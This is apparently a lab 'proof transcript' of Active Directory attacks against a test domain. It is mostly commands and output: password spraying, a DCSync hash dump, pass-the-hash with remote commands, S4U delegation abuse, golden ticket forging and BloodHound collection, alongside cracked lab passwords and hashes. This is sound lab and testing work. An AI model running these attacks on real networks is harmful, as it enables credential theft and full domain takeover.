84920674eb2351a3f0ed743ac2c3eed869df2f3c5938efcbe21f22c994e9b7804ea3de67201de14c7149ebc4bdb6e6d7da52720d46b877f4b403211191c4db39855ff3a1a7f27c8019d180192937849002409df694a6878e506c9986d03f0378f2a2628ff6174b3755b1844f9434cebe62f83bbe3062dfeb8dea259550ac576664425ffc29097eacb54d5d187cf4ed019731387bc917f57191d7550518b3b35500e2ceb1e6048e25702dc0078ffc3097215bf29109605b35732a05c0ce0ef0e9cb035c566e1310a7d8a7c78d10c90ef993111056d2dcc463f57ee0eea4e96c0763aeafdae10ef45d2212a4e014467fbb54077e81a0bf5a3f55432752300e7eebc2dda363b40f01298153a14f2323611b83486f1e5516b3f1f42f9f705f46fffb97951aa735799576b9f33b4deae530af67e936577c5b18d585d86cdc0e80db445861cbfad281b80267530a393f0ced165bacb3382cee3e276f0df68901bc83ff445d4fc0ff16234759e8fc343e69aa1b7639810cab42c4df142a28ba8d580cf78eacc88ce91a98e399707ac6f22cdc86d79f22696e3d45ec2ee4148dc8cc7ba7d5a0611f42644691464ed32c57a281830704ecfafeb860e0c3a449c42a5ca1f826deecb8a229b499a59187827af7740f292570ab0c1a7da783e705525c97e976c02259ef2d2408785259290fb7efce7daedf1486f4a6eb04650457ac7ef64955a84188e0f0c137fa0cdb3ca29e538fc6c6c5c82a10b45df05e288b9457df209abdfefdc204841a33ec246bacfba24cd50e068e8d0ec3bd02bac3527adff9:sunshine
+---
+
+
+========================================================================
+  PROOF: C3 — Password Spraying (netexec smb)
+  Date: $(date)  |  Kali → DC 192.168.184.142 (secops.local)
+========================================================================
+>>> $ netexec smb 192.168.184.142 -u users.txt -p Welcome1 (and 5 other rockyou pwds)
+SMB                      192.168.184.142 445    WIN-UH1G6PM8K1D  [+] secops.local\jdoe_legacy:Welcome1
+SMB                      192.168.184.142 445    WIN-UH1G6PM8K1D  [+] secops.local\helpdesk01:Password1
+SMB                      192.168.184.142 445    WIN-UH1G6PM8K1D  [+] secops.local\itadmin:letmein (Pwn3d!)
+SMB                      192.168.184.142 445    WIN-UH1G6PM8K1D  [+] secops.local\svc_legacy:abc123
+SMB                      192.168.184.142 445    WIN-UH1G6PM8K1D  [+] secops.local\dbadmin:trustno1
+SMB                      192.168.184.142 445    WIN-UH1G6PM8K1D  [+] secops.local\svc_sql:dragon
+
+
+========================================================================
+  PROOF: P2 — DCSync (impacket-secretsdump as analyst01)
+  Date: $(date)  |  Kali → DC 192.168.184.142 (secops.local)
+========================================================================
+>>> $ impacket-secretsdump secops.local/analyst01:Password1@192.168.184.142 -just-dc-ntlm
+--- key accounts from DCSync output ---
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e63612676a94b0cf4ec1c02e34b71ab2:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fe958fc215d5896194beef0e983901a7:::
+secops.local\svc_backup:1146:aad3b435b51404eeaad3b435b51404ee:acb91606f75d4825ccb09193c5a4c590:::
+secops.local\svc_sql:1147:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
+secops.local\svc_web:1148:aad3b435b51404eeaad3b435b51404ee:31c72c210ecc03d1eae94fa496069448:::
+secops.local\svc_scan:1149:aad3b435b51404eeaad3b435b51404ee:b963c57010f218edc2cc3c229b5e4d0f:::
+secops.local\helpdesk01:1150:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+secops.local\itadmin:1151:aad3b435b51404eeaad3b435b51404ee:becedb42ec3c5c7f965255338be4453c:::
+secops.local\jdoe_legacy:1152:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+secops.local\svc_legacy:1153:aad3b435b51404eeaad3b435b51404ee:f9e37e83b83c47a93c2f09f66408631b:::
+secops.local\analyst01:1154:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+secops.local\dbadmin:1155:aad3b435b51404eeaad3b435b51404ee:f773c5db7ddebefa4b0dae7ee8c50aea:::
+secops.local\lab_localadmin:1226:aad3b435b51404eeaad3b435b51404ee:31fc0dc8f7dfad0e8bd7ccc3842f2ce9:::
+[*] Cleaning up... 
+
+========================================================================
+  PROOF: L1 — Pass-the-Hash with NT hash + remote command execution
+  Date: $(date)  |  Kali → DC 192.168.184.142 (secops.local)
+========================================================================
+Extracted Administrator NT: e63612676a94b0cf4ec1c02e34b71ab2
+Extracted lab_localadmin NT: 31fc0dc8f7dfad0e8bd7ccc3842f2ce9
+
+>>> $ netexec smb 192.168.184.142 -u Administrator -H e63612676a94b0cf4ec1c02e34b71ab2 -x whoami
+SMB                      192.168.184.142 445    WIN-UH1G6PM8K1D  [*] Windows Server 2022 Build 20348 x64 (name:WIN-UH1G6PM8K1D) (domain:secops.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB                      192.168.184.142 445    WIN-UH1G6PM8K1D  [+] secops.local\Administrator:e63612676a94b0cf4ec1c02e34b71ab2 (Pwn3d!)
+SMB                      192.168.184.142 445    WIN-UH1G6PM8K1D  [+] Executed command via wmiexec
+SMB                      192.168.184.142 445    WIN-UH1G6PM8K1D  secops\administrator
+
+
+>>> $ netexec smb 192.168.184.142 -u Administrator -H e63612676a94b0cf4ec1c02e34b71ab2 -x "hostname && systeminfo | findstr /B Host"
+SMB                      192.168.184.142 445    WIN-UH1G6PM8K1D  [*] Windows Server 2022 Build 20348 x64 (name:WIN-UH1G6PM8K1D) (domain:secops.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB                      192.168.184.142 445    WIN-UH1G6PM8K1D  [+] secops.local\Administrator:e63612676a94b0cf4ec1c02e34b71ab2 (Pwn3d!)
+SMB                      192.168.184.142 445    WIN-UH1G6PM8K1D  [+] Executed command via wmiexec
+SMB                      192.168.184.142 445    WIN-UH1G6PM8K1D  WIN-UH1G6PM8K1D
+
+
+>>> $ netexec smb 192.168.184.142 -u lab_localadmin -H 31fc0dc8f7dfad0e8bd7ccc3842f2ce9
+SMB                      192.168.184.142 445    WIN-UH1G6PM8K1D  [*] Windows Server 2022 Build 20348 x64 (name:WIN-UH1G6PM8K1D) (domain:secops.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB                      192.168.184.142 445    WIN-UH1G6PM8K1D  [+] secops.local\lab_localadmin:31fc0dc8f7dfad0e8bd7ccc3842f2ce9 (Pwn3d!)
+
+
+========================================================================
+  PROOF: D2 — Constrained Delegation: S4U2Self → S4U2Proxy → Admin shares
+  Date: $(date)  |  Kali → DC 192.168.184.142 (secops.local)
+========================================================================
+>>> $ impacket-getST -spn cifs/WIN-UH1G6PM8K1D.secops.local -impersonate Administrator -dc-ip 192.168.184.142 secops.local/svc_sql:dragon
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_WIN-UH1G6PM8K1D.secops.local@SECOPS.LOCAL.ccache
+
+>>> $ ls -la *.ccache
+-rw-rw-r-- 1 kali kali 1235 Jun  8 20:47 /home/kali/AD-Playground-final/Administrator.ccache
+-rw-rw-r-- 1 kali kali 1683 Jun  8 21:30 /home/kali/AD-Playground-final/Administrator@cifs_WIN-UH1G6PM8K1D.secops.local@SECOPS.LOCAL.ccache
+-rw-rw-r-- 1 kali kali 1349 Jun  8 14:38 /home/kali/AD-Playground-final/svc_sql.ccache
+
+>>> $ KRB5CCNAME=Administrator@cifs_*.ccache impacket-smbclient -k -no-pass Administrator@WIN-UH1G6PM8K1D.secops.local <<<"shares"
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# ADMIN$
+C$
+IPC$
+IT_Share
+LabTrigger
+NETLOGON
+SYSVOL
+UpdateServicesPackages
+WsusContent
+WSUSTemp
+# Bye!
+
+
+
+========================================================================
+  PROOF: P4 — Golden Ticket: forge with krbtgt hash → access C$/SYSVOL
+  Date: $(date)  |  Kali → DC 192.168.184.142 (secops.local)
+========================================================================
+>>> Get domain SID
+[*] Domain SID is: S-1-5-21-787079104-4064912051-3981277777
+
+krbtgt NT hash from DCSync: fe958fc215d5896194beef0e983901a7
+Domain SID: S-1-5-21-787079104-4064912051-3981277777
+>>> $ impacket-ticketer -nthash fe958fc215d58961... -domain-sid S-1-5-21-787079104-4064912051-3981277777 -domain secops.local Administrator
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for secops.local/Administrator
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncAsRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncASRepPart
+[*] Saving ticket in Administrator.ccache
+
+>>> $ ls -la Administrator.ccache
+-rw-rw-r-- 1 kali kali 1235 Jun  8 21:30 /home/kali/AD-Playground-final/Administrator.ccache
+
+>>> $ KRB5CCNAME=Administrator.ccache impacket-smbclient -k -no-pass Administrator@WIN-UH1G6PM8K1D.secops.local <<<"shares"
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# ADMIN$
+C$
+IPC$
+IT_Share
+LabTrigger
+NETLOGON
+SYSVOL
+UpdateServicesPackages
+WsusContent
+WSUSTemp
+# Bye!
+
+
+
+========================================================================
+  PROOF: E4 — BloodHound collection artifact
+  Date: $(date)  |  Kali → DC 192.168.184.142 (secops.local)
+========================================================================
+>>> $ ls -la *bloodhound*.zip
+-rw-rw-r-- 1 kali kali 272673 Jun  8 20:47 /home/kali/AD-Playground-final/20260608204732_bloodhound.zip
+
+>>> $ unzip -l <latest bloodhound zip>
+Archive:  20260608204732_bloodhound.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+   121384  2026-06-08 20:47   20260608204732_users.json
+    94665  2026-06-08 20:47   20260608204732_groups.json
+     4255  2026-06-08 20:47   20260608204732_domains.json
+    18841  2026-06-08 20:47   20260608204732_ous.json
+     4178  2026-06-08 20:47   20260608204732_computers.json
+     3966  2026-06-08 20:47   20260608204732_gpos.json
+    24462  2026-06-08 20:47   20260608204732_containers.json
+---------                     -------
+   271751                     7 files
+
+
+========================================================================
+  PROOF: File artifacts retained on Kali for verification
+  Date: $(date)  |  Kali → DC 192.168.184.142 (secops.local)
+========================================================================
+total 332
+-rw-rw-r-- 1 kali kali      0 Jun  8 14:31 20260608143143_users.json
+-rw-rw-r-- 1 kali kali      0 Jun  8 14:35 20260608143530_users.json
+-rw-rw-r-- 1 kali kali 272673 Jun  8 20:47 20260608204732_bloodhound.zip
+-rw-r--r-- 1 kali kali     44 Jun  8 14:31 admin_creds.txt
+-rw-rw-r-- 1 kali kali   1235 Jun  8 21:30 Administrator.ccache
+-rw-rw-r-- 1 kali kali   1683 Jun  8 21:30 Administrator@cifs_WIN-UH1G6PM8K1D.secops.local@SECOPS.LOCAL.ccache
+-rw------- 1 kali kali     66 Jun  8 14:30 asrep.cracked
+-rw-rw-r-- 1 kali kali   3796 Jun  8 21:29 asrep.hash
+-rw-rw-r-- 1 kali kali     85 Jun  8 21:29 quick.txt
+-rw-r--r-- 1 kali kali    514 Jun  8 21:29 Services.xml
+-rw-rw-r-- 1 kali kali    111 Jun  8 21:30 spray.txt
+-rw-rw-r-- 1 kali kali    111 Jun  8 14:30 spray_users.txt
+-rw-rw-r-- 1 kali kali   1349 Jun  8 14:38 svc_sql.ccache
+-rw------- 1 kali kali     41 Jun  8 14:30 tgs.cracked
+-rw-rw-r-- 1 kali kali  10936 Jun  8 21:29 tgs.hash
+-rw-rw-r-- 1 kali kali    867 Jun  8 14:30 userlist.txt
+-rw-rw-r-- 1 kali kali    867 Jun  8 21:29 users.txt
+
+
+========================================================================
+  END OF PROOF TRANSCRIPT
+========================================================================
